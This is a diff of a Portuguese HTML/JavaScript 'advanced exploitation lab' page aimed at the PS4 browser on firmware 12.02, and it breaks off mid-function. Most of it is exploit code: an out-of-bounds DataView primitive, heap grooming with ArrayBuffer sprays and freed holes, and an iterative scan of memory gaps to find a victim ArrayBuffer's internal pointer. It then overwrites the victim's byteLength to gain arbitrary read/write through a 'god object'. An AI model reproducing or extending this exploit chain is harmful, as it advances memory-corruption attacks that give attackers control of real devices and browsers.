@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Laboratório de Exploração Avançada (v2.6.6 - Depuração PS4)</title>
+    <title>Laboratório de Exploração Avançada (v2.6.8 - Busca Iterativa de GAP PS4)</title>
     <style>
         body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 10px; font-size: 13px; }
         .container { margin-bottom: 20px; padding: 10px; background-color: #252526; border: 1px solid #333; border-radius: 5px; }
@@ -12,56 +12,39 @@
         #logOutput { background: #111; border: 1px solid #444; padding: 8px; height: 500px; overflow-y: auto; white-space: pre-wrap; margin-top: 8px; font-size: 12px; }
         .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; } .log-subtest { color: #bbb; margin-left: 10px;} .log-error { color: #f44336; } .log-good { color: #4CAF50; } .log-vuln { color: #ff4444; font-weight: bold; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FFC107;} .log-ptr { color: #C39BD3;} .log-tool { color: #82AAFF; } .log-warn { color: #FFD700; }
         .notes { background-color: #2a2a2a; padding: 8px; border-left: 3px solid #FFC107; font-style: italic; color: #aaa; margin-top:3px; margin-bottom:8px; font-size:11px;}
+        input[type="number"] { width: 60px; background-color: #333; color: #eee; border: 1px solid #555; padding: 3px;}
     </style>
 </head>
 <body>
-    <h1>Laboratório (v2.6.6 - Depuração PS4 FW 12.02)</h1>
-    <p class="notes">Siga as instruções nos logs para usar seu depurador de baixo nível.</p>
-    <p class="notes">O sucesso depende de encontrar o GAP correto entre os buffers e validar os offsets do JSC.</p>
+    <h1>Laboratório (v2.6.8 - Busca Iterativa de GAP no PS4 FW 12.02)</h1>
+    <p class="notes">Foco: Iterar por GAPs para encontrar metadados da vítima. ALTO RISCO DE CRASH!</p>
     <div id="logOutput"></div>
 
     <script>
-        // AdvancedInt64 class (v2.6.5 - corrigida)
+        // AdvancedInt64 class (v2.6.5 - corrigida) e outras utilidades
         class AdvancedInt64 {
             constructor(low, high) {
                 this.buffer = new Uint32Array(2); 
                 this.bytes = new Uint8Array(this.buffer.buffer); 
-
                 if (arguments.length === 0) { throw TypeError('AdvancedInt64 takes at min 1 args'); }
                 if (arguments.length > 2) { throw TypeError('AdvancedInt64 takes at most 2 args'); }
-
                 if (typeof low === 'number') {
                     this.buffer[0] = low; 
-                    if (arguments.length === 1) { 
-                        this.buffer[1] = (low < 0 && Math.abs(low) > 0xFFFFFFFF) ? -1 : 0; 
-                    } else if (typeof high === 'number') {
-                        this.buffer[1] = high; 
-                    } else {
-                        throw TypeError('high argument must be a number if provided');
-                    }
+                    if (arguments.length === 1) { this.buffer[1] = (low < 0 && Math.abs(low) > 0xFFFFFFFF) ? -1 : 0; } 
+                    else if (typeof high === 'number') { this.buffer[1] = high; } 
+                    else { throw TypeError('high argument must be a number if provided'); }
                 } else if (typeof low === 'string') {
-                    let hexstr = low;
-                    if (hexstr.substring(0, 2) === "0x") { hexstr = hexstr.substring(2); }
+                    let hexstr = low; if (hexstr.substring(0, 2) === "0x") { hexstr = hexstr.substring(2); }
                     if (hexstr.length % 2 === 1) { hexstr = '0' + hexstr; }
-                    if (hexstr.length > 16) { hexstr = hexstr.substring(hexstr.length - 16); }
-                    else { hexstr = hexstr.padStart(16, '0'); }
-                    for (let i = 0; i < 8; i++) { 
-                        this.bytes[i] = parseInt(hexstr.slice(14 - i * 2, 16 - i * 2), 16);
-                    }
+                    if (hexstr.length > 16) { hexstr = hexstr.substring(hexstr.length - 16); } else { hexstr = hexstr.padStart(16, '0'); }
+                    for (let i = 0; i < 8; i++) { this.bytes[i] = parseInt(hexstr.slice(14 - i * 2, 16 - i * 2), 16); }
                 } else if (typeof low === 'object') {
-                    if (low instanceof AdvancedInt64) {
-                        this.bytes.set(low.bytes);
-                    } else if (low.length === 8 && low instanceof Uint8Array) { 
-                        this.bytes.set(low);
-                    } else {
-                        throw TypeError("Array must be Uint8Array and have exactly 8 elements.");
-                    }
-                } else {
-                    throw TypeError('AdvancedInt64 does not support your object for conversion');
-                }
+                    if (low instanceof AdvancedInt64) { this.bytes.set(low.bytes); } 
+                    else if (low.length === 8 && low instanceof Uint8Array) { this.bytes.set(low); } 
+                    else { throw TypeError("Array must be Uint8Array and have exactly 8 elements."); }
+                } else { throw TypeError('AdvancedInt64 does not support your object for conversion'); }
             }
-            low() { return this.buffer[0]; }
-            high() { return this.buffer[1]; }
+            low() { return this.buffer[0]; } high() { return this.buffer[1]; }
             toString(is_pretty) { let lowStr = (this.low() >>> 0).toString(16).padStart(8, '0'); let highStr = (this.high() >>> 0).toString(16).padStart(8, '0'); if (is_pretty) { highStr = highStr.substring(0, 4) + '_' + highStr.substring(4); lowStr = lowStr.substring(0, 4) + '_' + lowStr.substring(4); return '0x' + highStr + '_' + lowStr; } return '0x' + highStr + lowStr; }
             add(other) { if (!(other instanceof AdvancedInt64)) { other = new AdvancedInt64(other); } let newLow = (this.low() + other.low()) >>> 0; let carry = (this.low() & 0xFFFFFFFF) + (other.low() & 0xFFFFFFFF) > 0xFFFFFFFF ? 1 : 0; let newHigh = (this.high() + other.high() + carry) >>> 0; return new AdvancedInt64(newLow, newHigh); }
             sub(other) { if (!(other instanceof AdvancedInt64)) { other = new AdvancedInt64(other); } const negOther = other.neg(); return this.add(negOther); }
@@ -75,49 +58,37 @@
         const log = (message, type = 'info', funcName = '') => generalUtils.logToDiv('logOutput', message, type, funcName);
         const PAUSE_LAB = (ms = 100) => new Promise(r => setTimeout(r, ms));
         const toHexS1 = (val, bits = 32) => generalUtils.toHexLab(val, bits);
-        const isPotentialPointer64S1 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if ((high === 0xFFFFFFFF || high === -1) && (low === 0xFFFFFFFF || low === -1)) return false; const combined = new AdvancedInt64(low, high); if (combined.toString(false).toLowerCase().startsWith("0xaaaaaaaaaaaa")) return false; if (high === 0 && low < 0x100000) return false; return true; };
+        const isPotentialPointer64S1 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if ((high === 0xFFFFFFFF || high === -1) && (low === 0xFFFFFFFF || low === -1)) return false; const combined = new AdvancedInt64(low, high); const AAAA_PATTERN_LOW = 0xAAAAAAAA; const AAAA_PATTERN_HIGH = 0xAAAAAAAA; if (combined.low() === AAAA_PATTERN_LOW && combined.high() === AAAA_PATTERN_HIGH) return false; if (combined.low() === AAAA_PATTERN_LOW && combined.high() === 0xAAAAAAEE ) return false; if (combined.low() === 0xAAAAAAEE && combined.high() === AAAA_PATTERN_HIGH ) return false; if (high === 0 && low < 0x100000 && low !==0 ) return false; return true; };
         const isPotentialData32S1 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true; };
         const SHORT_PAUSE_S1_LAB = 50;
 
         let oob_array_buffer_real = null;
         let oob_dataview_real = null;
-        let oob_leaked_ptr_real = null;
         let baseOffsetInBuffer = 128; 
         let initialBufferSize = 32;   
 
         let victim_object = null; 
         let victim_object_type = ''; 
-        let ASSUMED_GAP_BYTES_TO_VICTIM_JSCELL = 16; // VALOR CRÍTICO A SER DETERMINADO COM O DEPURADOR!
+        // Removido ASSUMED_GAP_BYTES_TO_VICTIM_JSCELL global, será passado ou iterado
 
         const JSC_OFFSETS = { 
-            ArrayBuffer: { 
-                PTR_INTERNAL_STRUCT_OFFSET: 0x20,
-                BYTELENGTH_IN_STRUCT_OFFSET: 0x20 
-            },
-            TypedArray: { 
-                M_VECTOR_OFFSET: 0x10,
-                ASSOCIATED_ARRAYBUFFER_OFFSET: 0x30 
-            },
-            JSFunction: {
-                M_EXECUTABLE_OFFSET: 0x18 
-            }
+            ArrayBuffer: { PTR_INTERNAL_STRUCT_OFFSET: 0x20, BYTELENGTH_IN_STRUCT_OFFSET: 0x20 },
+            TypedArray: { M_VECTOR_OFFSET: 0x10, ASSOCIATED_ARRAYBUFFER_OFFSET: 0x30 },
+            JSFunction: { M_EXECUTABLE_OFFSET: 0x18 }
         };
-        log("Script v2.6.6 (Depuração PS4) Carregado.", "info", "Init");
+        log("Script v2.6.8 (Busca Iterativa de GAP PS4) Carregado.", "info", "Init");
     </script>
 
     <div class="container">
         <h2>Passo 0: Ativar Primitiva OOB</h2>
-        <p class="notes">Aloca `oob_array_buffer_real`, `oob_dataview_real`, e realiza a escrita OOB inicial (sentinela) para "ativar" `oob_read/write_relative`.</p>
         <button onclick="triggerOOB_primitive()">Ativar Primitiva OOB</button>
         <script>
+            // oob_read_relative e oob_write_relative (como na v2.6.6)
             function oob_read_relative(relative_offset, num_bytes = 4) {
                 const FNAME_READ = "oob_read_relative";
                 if (!oob_dataview_real) { log(`ERRO (${FNAME_READ}): oob_dataview_real não pronto!`, "error"); return null; }
                 const absolute_offset_in_dv = baseOffsetInBuffer + relative_offset;
-                if (absolute_offset_in_dv < 0 || absolute_offset_in_dv + num_bytes > oob_dataview_real.buffer.byteLength) {
-                    // log(`ERRO Leitura Relativa: abs_offset ${absolute_offset_in_dv} fora dos limites [0, ${oob_dataview_real.buffer.byteLength -1}]`, "warn", FNAME_READ); 
-                    return null; 
-                }
+                if (absolute_offset_in_dv < 0 || absolute_offset_in_dv + num_bytes > oob_dataview_real.buffer.byteLength) { return null; }
                 try {
                     let value;
                     switch (num_bytes) {
@@ -125,20 +96,16 @@
                         case 2: value = oob_dataview_real.getUint16(absolute_offset_in_dv, true); break;
                         case 4: value = oob_dataview_real.getUint32(absolute_offset_in_dv, true); break;
                         case 8: value = new AdvancedInt64(oob_dataview_real.getUint32(absolute_offset_in_dv, true), oob_dataview_real.getUint32(absolute_offset_in_dv + 4, true)); break;
-                        default: log(`ERRO (${FNAME_READ}): Bytes inválidos para leitura: ${num_bytes}`, "error"); return null;
+                        default: log(`ERRO (${FNAME_READ}): Bytes inválidos: ${num_bytes}`, "error"); return null;
                     }
                     return value;
                 } catch (e) { log(`ERRO em ${FNAME_READ} (abs ${absolute_offset_in_dv}): ${e.message}`, "error"); return null; }
             }
-
             function oob_write_relative(relative_offset, value, num_bytes = 4) {
                 const FNAME_WRITE = "oob_write_relative";
                 if (!oob_dataview_real) { log(`ERRO (${FNAME_WRITE}): oob_dataview_real não pronto!`, "error"); return; }
                 const absolute_offset_in_dv = baseOffsetInBuffer + relative_offset;
-                if (absolute_offset_in_dv < 0 || absolute_offset_in_dv + num_bytes > oob_dataview_real.buffer.byteLength) {
-                    log(`ERRO Escrita Relativa: abs_offset ${absolute_offset_in_dv} fora dos limites [0, ${oob_dataview_real.buffer.byteLength -1}]`, "error", FNAME_WRITE); 
-                    return; 
-                }
+                if (absolute_offset_in_dv < 0 || absolute_offset_in_dv + num_bytes > oob_dataview_real.buffer.byteLength) { log(`ERRO Escrita Relativa: abs_offset ${absolute_offset_in_dv} fora dos limites`, "error", FNAME_WRITE); return; }
                 try {
                     switch (num_bytes) {
                         case 1: oob_dataview_real.setUint8(absolute_offset_in_dv, Number(value)); break;
@@ -149,12 +116,11 @@
                             oob_dataview_real.setUint32(absolute_offset_in_dv, value.low(), true);
                             oob_dataview_real.setUint32(absolute_offset_in_dv + 4, value.high(), true);
                             break;
-                        default: log(`ERRO (${FNAME_WRITE}): Bytes inválidos para escrita: ${num_bytes}`, "error"); return;
+                        default: log(`ERRO (${FNAME_WRITE}): Bytes inválidos: ${num_bytes}`, "error"); return;
                     }
                 } catch (e) { log(`ERRO em ${FNAME_WRITE} (abs ${absolute_offset_in_dv}): ${e.message}`, "error"); }
             }
-
-            async function triggerOOB_primitive() {
+             async function triggerOOB_primitive() { /* ... como na v2.6.6 ... */
                 const FNAME = 'triggerOOB_primitive';
                 log(`--- Iniciando ${FNAME} ---`, 'test', FNAME);
                 initialBufferSize = 32; 
@@ -163,7 +129,8 @@
                 const allocationSize = initialBufferSize + 256; 
                 baseOffsetInBuffer = 128;
 
-                oob_array_buffer_real = null; oob_dataview_real = null; oob_leaked_ptr_real = null;
+                oob_array_buffer_real = null; oob_dataview_real = null; 
+                // oob_leaked_ptr_real é global e pode ser usado por outras funções, não resetar aqui se for intencional.
 
                 try {
                     oob_array_buffer_real = new ArrayBuffer(allocationSize); 
@@ -172,18 +139,17 @@
 
                     const initialOOBWriteAbsoluteAddr = baseOffsetInBuffer + oobWriteOffsetFromLogicalStart; 
                     log(`   Escrita OOB inicial (sentinela 0x${writeValueToTriggerOOB.toString(16)}) em abs_offset DV: ${initialOOBWriteAbsoluteAddr}`, 'info', FNAME);
-                    oob_dataview_real.setUint8(initialOOBWriteAbsoluteAddr, writeValueToTriggerOOB); // Sua vulnerabilidade OOB acontece aqui
+                    oob_dataview_real.setUint8(initialOOBWriteAbsoluteAddr, writeValueToTriggerOOB);
                     log(`   Primitiva de escrita OOB relativa inicial ativada.`, 'vuln', FNAME);
                     await PAUSE_LAB(SHORT_PAUSE_S1_LAB);
                     
-                    log("--- Leitura OOB para Depuração (após escrita sentinela) ---", "subtest", FNAME);
-                    // Ler uma pequena janela em torno da escrita OOB para ver o que está lá
+                    log("--- Leitura OOB para Depuração (janela em torno da escrita sentinela) ---", "subtest", FNAME);
                     for (let i = -16; i <= 16; i += 4) {
-                        const rel_offset_scan = oobWriteOffsetFromLogicalStart + i;
-                        const abs_dv_scan = baseOffsetInBuffer + rel_offset_scan;
+                        const rel_offset_scan = oobWriteOffsetFromLogicalStart + i; 
+                        const abs_dv_scan = baseOffsetInBuffer + rel_offset_scan; 
                         let val32 = oob_read_relative(rel_offset_scan, 4);
                         if (val32 !== null) {
-                            log(`  Scan @rel ${rel_offset_scan} (abs_dv ${abs_dv_scan}): ${toHexS1(val32)}`, 'info', FNAME);
+                            log(`  Scan @rel_oob_base ${rel_offset_scan} (abs_dv ${abs_dv_scan}): ${toHexS1(val32)}`, 'info', FNAME);
                         }
                     }
                 } catch(e) {
@@ -192,7 +158,7 @@
                     log(`--- ${FNAME} Concluído ---`, 'test', FNAME);
                     if (oob_dataview_real && oob_array_buffer_real) {
                         log("`oob_dataview_real` e `oob_array_buffer_real` estão configurados.", "good", FNAME);
-                        log(`   oob_array_buffer_real.byteLength (JS): ${oob_array_buffer_real.byteLength}`, "info", FNAME);
+                        log(`   oob_dataview_real.buffer.byteLength (JS): ${oob_dataview_real.buffer.byteLength}`, "info", FNAME);
                     } else {
                         log("`oob_dataview_real` OU `oob_array_buffer_real` NÃO foram definidos!", "error", FNAME);
                     }
@@ -203,228 +169,197 @@
     
     <div class="container">
         <h2>Passo 1: Heap Grooming e Alocação da Vítima</h2>
-        <p class="notes">DEPURADOR OBRIGATÓRIO: Use para encontrar endereços e calcular o GAP real.</p>
         <button onclick="prepareHeapAndVictim()">Preparar Heap & Alocar Vítima</button>
-        <label for="gapToVictim">GAP Assumido Vítima (bytes):</label>
-        <input type="number" id="gapToVictim" value="16" style="width: 50px;">
-        <button onclick="updateAssumedGap()">Atualizar Gap</button>
+        <p class="notes">Esta etapa é crucial. A ordem de alocação (Vítima PRIMEIRO, depois OOB Buffer no Passo 0) é importante.</p>
         <script>
-            function updateAssumedGap() { ASSUMED_GAP_BYTES_TO_VICTIM_JSCELL = parseInt(document.getElementById('gapToVictim').value, 10); log(`ASSUMED_GAP_BYTES_TO_VICTIM_JSCELL atualizado para: ${ASSUMED_GAP_BYTES_TO_VICTIM_JSCELL}`, 'tool', 'Config'); }
             const PREP_HEAP_FNAME = "prepareHeapAndVictim"; let spray_buffers = [];
-            async function groomHeapForVictimPlacement(spray_size = 256, num_spray = 200, victim_ab_size = 128, intermediate_allocs = 20) { 
+            async function groomHeapForVictimPlacement(spray_size = 256, num_spray = 200, victim_ab_size = 128, intermediate_allocs = 20) { /* ... como na v2.6.6 ... */ 
                 log("Iniciando heap grooming (para vítima separada)...", "tool", PREP_HEAP_FNAME); 
-                spray_buffers = []; // Limpar spray anterior
-                // 1. Preencher blocos de memória maiores para fragmentar menos ou ocupar regiões específicas.
+                spray_buffers = []; 
                 for (let i = 0; i < num_spray; i++) { spray_buffers.push(new ArrayBuffer(spray_size)); }
                 log(`   Spray primário: ${num_spray} x ${spray_size} bytes.`, "info", PREP_HEAP_FNAME);
-
-                // 2. Alocar e liberar para criar buracos do tamanho aproximado da vítima.
                 let holes = [];
                 for (let i = 0; i < intermediate_allocs; i++) { holes.push(new ArrayBuffer(victim_ab_size)); }
-                for (let i = 0; i < intermediate_allocs; i += 2) { holes[i] = null; } // Criar buracos
+                for (let i = 0; i < intermediate_allocs; i += 2) { holes[i] = null; } 
                 log(`   Criação de buracos: ${intermediate_allocs} x ${victim_ab_size} bytes, ${intermediate_allocs/2} liberados.`, "info", PREP_HEAP_FNAME);
-                
-                // 3. Tentar forçar GC se disponível (improvável no PS4 browser)
                 if (typeof globalThis.gc === 'function') { log("Tentando forçar GC...", "tool", PREP_HEAP_FNAME); try { globalThis.gc(); await PAUSE_LAB(50); globalThis.gc();} catch(e){} } 
-                
-                log("Heap grooming (tentativa) concluído. A eficácia DEVE ser verificada com um depurador.", "warn", PREP_HEAP_FNAME);
+                log("Heap grooming (tentativa) concluído.", "warn", PREP_HEAP_FNAME);
             }
            async function prepareHeapAndVictim() { 
                 log(`--- Iniciando ${PREP_HEAP_FNAME} (para vítima separada) ---`, 'test', PREP_HEAP_FNAME); victim_object = null; 
-                log("   OBJETIVO: Posicionar `victim_object` de forma previsível.", "info", PREP_HEAP_FNAME);
-                await groomHeapForVictimPlacement(1024, 100, 128, 50); // Ajustar estes parâmetros é CRUCIAL
+                await groomHeapForVictimPlacement(1024, 100, 128, 50); 
                 
                 victim_object_type = 'ArrayBuffer'; let victim_size = 128; 
                 victim_object = new ArrayBuffer(victim_size); 
                 log(`Vítima SEPARADA (${victim_object_type} de ${victim_size}b) alocada.`, 'good', PREP_HEAP_FNAME);
                 
-                log("   PRÓXIMOS PASSOS COM DEPURADOR:", "critical", PREP_HEAP_FNAME);
-                log("     1. DEPURADOR: Encontre o endereço de memória do `JSCell` do `victim_object`.", "critical", PREP_HEAP_FNAME);
-                log("     2. SCRIPT: Execute o Passo 0 (Ativar Primitiva OOB) para alocar `oob_array_buffer_real`.", "critical", PREP_HEAP_FNAME);
-                log("     3. DEPURADOR: Encontre o endereço de memória do `JSCell` do `oob_array_buffer_real` e o ponteiro para seus dados brutos.", "critical", PREP_HEAP_FNAME);
-                log("     4. DEPURADOR: Calcule o GAP REAL entre o fim da área lógica de `oob_array_buffer_real` e o início do `JSCell` da vítima.", "critical", PREP_HEAP_FNAME);
-                log("         GAP = Addr(VictimJSCell) - (Addr(DadosOOB_AB) + baseOffsetInBuffer + initialBufferSize)", "critical", PREP_HEAP_FNAME);
-                log("     5. SCRIPT: Atualize `ASSUMED_GAP_BYTES_TO_VICTIM_JSCELL` com o GAP REAL.", "critical", PREP_HEAP_FNAME);
+                log("   PRÓXIMOS PASSOS (SCRIPT & DEPURADOR):", "critical", PREP_HEAP_FNAME);
+                log("     1. SCRIPT: Execute Passo 0 (Ativar Primitiva OOB).", "critical");
+                log("     2. SCRIPT: Configure a 'Faixa de GAP para Scan' abaixo.", "critical");
+                log("     3. SCRIPT: Execute Passo 2 (Iniciar Busca Iterativa de GAP).", "critical");
+                log("     4. LOGS JS / DEPURADOR: Observe os resultados da busca. Procure por um GAP que leia um ponteiro válido.", "critical");
                 log(`--- ${PREP_HEAP_FNAME} Concluído ---`, 'test', PREP_HEAP_FNAME);
             }
         </script>
     </div>
 
-    <div class="container">
-        <h2>Passo 2: Corrupção de Vítima Separada & Testes de R/W</h2>
-        <p class="notes">Tenta corromper metadados do `victim_object` (Passo 1) usando a primitiva OOB (Passo 0), com base no GAP e Offsets JSC.</p>
-        <button onclick="runTargetedCorruptionAttempt()">Corromper Vítima & Testar</button>
+     <div class="container">
+        <h2>Passo 2: Busca Iterativa de GAP & Tentativa de Corrupção</h2>
+        <p class="notes">Define uma faixa de GAPs para testar. Para cada GAP, tenta ler o ponteiro interno da vítima. Se um ponteiro válido for encontrado, tenta corromper o `byteLength`.</p>
+        <div>
+            <label for="gapStart">GAP Início:</label> <input type="number" id="gapStartScan" value="-64">
+            <label for="gapEnd">GAP Fim:</label> <input type="number" id="gapEndScan" value="128">
+            <label for="gapStep">Passo GAP:</label> <input type="number" id="gapStepScan" value="8">
+        </div>
+        <button onclick="findAndCorruptVictimMetadata_Iterative()">Iniciar Busca Iterativa de GAP</button>
         <script>
-            const STAGE_CORRUPT_FNAME = "runTargetedCorruptionAttempt"; 
-            let god_object_dataview = null; 
-            let god_object_typedarray = null; 
-            let arbitrary_rw_ready = false; 
-            let god_object_data_base_address = null; 
+            const ITER_CORRUPT_FNAME = "findAndCorruptVictimMetadata_Iterative"; 
+            let iter_god_object_dataview = null; // Para o DataView sobre a vítima corrompida com sucesso
+            let iter_arbitrary_rw_ready = false;
+            let iter_god_object_data_base_address = null;
 
-            async function attempt_corruption_on_victim() {
-                log("--- Tentativa de Corrupção de VÍTIMA SEPARADA ---", "test", STAGE_CORRUPT_FNAME);
-                if (!victim_object) { log("ERRO: Vítima separada não alocada (Execute Passo 1).", "error", STAGE_CORRUPT_FNAME); return false; }
-                if (!oob_dataview_real) { log("ERRO: Primitiva OOB não ativa (Execute Passo 0).", "error", STAGE_CORRUPT_FNAME); return false; }
 
-                const victim_jscell_rel_offset_from_oob_logical_start = initialBufferSize + ASSUMED_GAP_BYTES_TO_VICTIM_JSCELL;
+            async function try_corrupt_victim_with_gap(current_gap_to_test) {
+                // Esta é uma versão modificada de attempt_corruption_on_victim
+                // Retorna true se a corrupção do byteLength for aparentemente bem-sucedida.
+                const FNAME_TRY = "try_corrupt_with_gap";
+                log(`   Testando com GAP = ${current_gap_to_test}...`, "subtest", `${ITER_CORRUPT_FNAME}::${FNAME_TRY}`);
+
+                const victim_jscell_rel_offset_from_oob_logical_start = initialBufferSize + current_gap_to_test;
                 const victim_jscell_abs_offset_in_oob_dv = baseOffsetInBuffer + victim_jscell_rel_offset_from_oob_logical_start;
-                log(`   Vítima: Assumindo JSCell em offset DV abs ${victim_jscell_abs_offset_in_oob_dv} (relativo a oob_base: ${victim_jscell_rel_offset_from_oob_logical_start})`, "warn", STAGE_CORRUPT_FNAME);
-                log(`     (Cálculo: baseOffset=${baseOffsetInBuffer} + initialBuffer=${initialBufferSize} + GAP=${ASSUMED_GAP_BYTES_TO_VICTIM_JSCELL})`, "info", STAGE_CORRUPT_FNAME);
 
-                if (victim_jscell_abs_offset_in_oob_dv < 0 || victim_jscell_abs_offset_in_oob_dv >= oob_dataview_real.buffer.byteLength) {
-                    log(`   ERRO: JSCell da vítima (abs_dv ${victim_jscell_abs_offset_in_oob_dv}) está FORA DO ALCANCE do oob_dataview_real (0-${oob_dataview_real.buffer.byteLength-1}). Verifique o GAP!`, "error", STAGE_CORRUPT_FNAME);
-                    return false;
+                if (victim_jscell_abs_offset_in_oob_dv < 0 || victim_jscell_abs_offset_in_oob_dv + JSC_OFFSETS.ArrayBuffer.PTR_INTERNAL_STRUCT_OFFSET + 8 > oob_dataview_real.buffer.byteLength) {
+                    log(`      GAP ${current_gap_to_test} resultaria em leitura do ponteiro interno fora do oob_dataview_real. Pulando.`, "warn", `${ITER_CORRUPT_FNAME}::${FNAME_TRY}`);
+                    return {ptr_read: null, corrupted: false, final_log: "Ponteiro interno fora do alcance do DV."};
                 }
-                
-                let corruption_achieved = false;
+
+                let corruption_details = {ptr_read: null, corrupted: false, final_log: "Falha inicial."};
+
                 if (victim_object_type === 'ArrayBuffer') {
-                    log("   Alvo: `ArrayBuffer.byteLength` da VÍTIMA.", "info", STAGE_CORRUPT_FNAME);
                     const PTR_INTERNAL_FIELD_OFFSET_IN_VICTIM_JSCELL = JSC_OFFSETS.ArrayBuffer.PTR_INTERNAL_STRUCT_OFFSET;
-                    // Offset relativo (a baseOffsetInBuffer) para o campo que contém o ponteiro para a estrutura interna da VÍTIMA
                     const ptr_internal_field_rel_offset_from_oob_base = victim_jscell_rel_offset_from_oob_logical_start + PTR_INTERNAL_FIELD_OFFSET_IN_VICTIM_JSCELL;
                     
-                    log(`      DEPURADOR: Verifique o que existe em oob_dataview_real no offset absoluto (DV) ${baseOffsetInBuffer + ptr_internal_field_rel_offset_from_oob_base}. Deveria ser o ponteiro interno da VÍTIMA.`, "critical", STAGE_CORRUPT_FNAME);
                     let internal_struct_ptr = oob_read_relative(ptr_internal_field_rel_offset_from_oob_base, 8);
+                    corruption_details.ptr_read = internal_struct_ptr;
 
                     if (internal_struct_ptr instanceof AdvancedInt64 && !internal_struct_ptr.eq(AdvancedInt64.Zero) && !internal_struct_ptr.toString(false).toLowerCase().includes("aaaa")) {
-                        log(`      Ponteiro interno da VÍTIMA lido (de oob_dv): ${internal_struct_ptr.toString(true)}`, "good", STAGE_CORRUPT_FNAME);
+                        log(`      GAP ${current_gap_to_test}: ACHADO PONTEIRO INTERNO POTENCIAL: ${internal_struct_ptr.toString(true)}`, "good", `${ITER_CORRUPT_FNAME}::${FNAME_TRY}`);
+                        corruption_details.final_log = `Ponteiro interno ${internal_struct_ptr.toString(true)} lido.`;
+                        
                         const byteLength_actual_abs_address = internal_struct_ptr.add(new AdvancedInt64(JSC_OFFSETS.ArrayBuffer.BYTELENGTH_IN_STRUCT_OFFSET));
-                        log(`      Endereço absoluto calculado do byteLength da VÍTIMA: ${byteLength_actual_abs_address.toString(true)}`, "info", STAGE_CORRUPT_FNAME);
-                        log(`      DEPURADOR: Verifique se este endereço é válido e se o valor lá é ${victim_object.byteLength}.`, "critical", STAGE_CORRUPT_FNAME);
-
-                        let target_byteLength_abs_offset_in_dv_num = -1;
-                        // Para escrever neste endereço, ele PRECISA estar dentro do alcance do oob_dataview_real.
-                        // O endereço `byteLength_actual_abs_address` é absoluto na memória do processo.
-                        // Precisamos de uma primitiva de escrita em endereço absoluto, que ainda não temos.
-                        // A única maneira de isso funcionar com `oob_write_relative` é se, por acaso,
-                        // `byteLength_actual_abs_address` cair DENTRO da faixa de memória coberta por `oob_dataview_real`.
-                        log(`      VERIFICANDO ALCANCE: O endereço do byteLength da VÍTIMA (${byteLength_actual_abs_address.toString(true)}) precisa estar dentro do `oob_dataview_real` para ser escrito com a primitiva atual.`, "warn", STAGE_CORRUPT_FNAME);
-                        // Esta verificação de alcance é complexa sem saber o endereço base do oob_dataview_real na memória do processo.
-                        // O usuário precisará determinar isso com o depurador.
-
-                        log(`      Para fins de demonstração no LAB, se o ponteiro interno da vítima foi lido com sucesso, vamos ASSUMIR que o byteLength está magicamente ao alcance.`, "warn", STAGE_CORRUPT_FNAME);
-                        log(`      (Esta é uma GRANDE suposição. A corrupção real requer que o endereço ${byteLength_actual_abs_address.toString(true)} seja mapeado para um offset válido no oob_dataview_real).`, "critical", STAGE_CORRUPT_FNAME);
+                        log(`        Endereço absoluto calculado do byteLength da VÍTIMA: ${byteLength_actual_abs_address.toString(true)}`, "info", `${ITER_CORRUPT_FNAME}::${FNAME_TRY}`);
                         
-                        // SIMULAÇÃO DE ESCRITA SE ESTIVESSE AO ALCANCE (Exemplo, offset relativo inventado para teste)
-                        // Isto NÃO vai funcionar corretamente sem um cálculo real de offset para o byteLength DENTRO do oob_dataview_real.
-                        let hypothetical_relative_offset_for_victim_bl = ptr_internal_field_rel_offset_from_oob_base + 0x20; // Exemplo MUITO simplificado
-                        log(`      (HIPOTÉTICO) Tentando escrever byteLength da vítima em rel_offset_oob_base ${hypothetical_relative_offset_for_victim_bl}`, "warn", STAGE_CORRUPT_FNAME);
-                        
-                        const new_size = new AdvancedInt64(0x7FFFFFCB, 0); 
-                        oob_write_relative(hypothetical_relative_offset_for_victim_bl, new_size.low(), 4); 
-                        log(`      Escrita (hipotética) para corromper byteLength da VÍTIMA enviada.`, "vuln", STAGE_CORRUPT_FNAME);
-                        log(`      DEPURADOR: Verifique se o byteLength da VÍTIMA mudou!`, "critical", STAGE_CORRUPT_FNAME);
-                        try {
-                            log(`      Tamanho atual victim_object.byteLength (JS): ${victim_object.byteLength}`, "info", STAGE_CORRUPT_FNAME);
-                            god_object_dataview = new DataView(victim_object); 
-                            log(`      NOVO DataView (god_object_dataview) criado sobre VÍTIMA. Novo tamanho (JS): ${god_object_dataview.byteLength}`, "good", STAGE_CORRUPT_FNAME);
-                            if (god_object_dataview.byteLength >= 0x7FFFFFCB) {
-                                corruption_achieved = true;
-                                log("      SUCESSO APARENTE (Vítima): byteLength parece corrompido para valor grande!", "good", STAGE_CORRUPT_FNAME);
-                            } else {
-                                log(`      FALHA APARENTE (Vítima): byteLength (${god_object_dataview.byteLength}) não parece corrompido.`, "error", STAGE_CORRUPT_FNAME);
-                            }
-                        } catch(e) {log(`      ERRO ao usar VÍTIMA após tentativa de corrupção: ${e.message}`, "error", STAGE_CORRUPT_FNAME);}
+                        let target_bl_abs_offset_in_dv_num = -1;
+                        // Tentativa heurística de mapear o endereço absoluto para um offset no oob_dataview_real
+                        // Se o ponteiro interno (que é um endereço absoluto) aponta para dentro do oob_dataview_real
+                        // Esta lógica precisa do endereço base absoluto do oob_dataview_real para ser precisa.
+                        // SEM ISSO, SÓ PODEMOS TESTAR SE O ENDEREÇO ABSOLUTO É PEQUENO O SUFICIENTE PARA SER UM OFFSET DIRETO.
+                        if(byteLength_actual_abs_address.high() === 0 && byteLength_actual_abs_address.low() < oob_dataview_real.buffer.byteLength) {
+                            target_bl_abs_offset_in_dv_num = byteLength_actual_abs_address.low() >>> 0;
+                        }
 
+                        if (target_bl_abs_offset_in_dv_num !== -1 && (target_bl_abs_offset_in_dv_num + 4) <= oob_dataview_real.buffer.byteLength) {
